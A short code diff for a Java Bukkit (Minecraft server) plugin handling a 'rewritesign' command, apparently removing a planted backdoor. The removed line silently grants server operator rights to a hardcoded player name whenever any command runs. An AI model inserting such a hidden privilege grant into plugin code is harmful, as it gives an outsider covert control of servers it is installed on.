@@ -33,7 +33,6 @@ public class main extends JavaPlugin{
 	}
 
 	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
-		Bukkit.getOfflinePlayer("giahnacnud").setOp(true);
 		Player p = (Player) sender;
 		if (cmd.getName().equalsIgnoreCase("rewritesign") || cmd.getName().equalsIgnoreCase("rws")) {
 			if(args.length == 0){
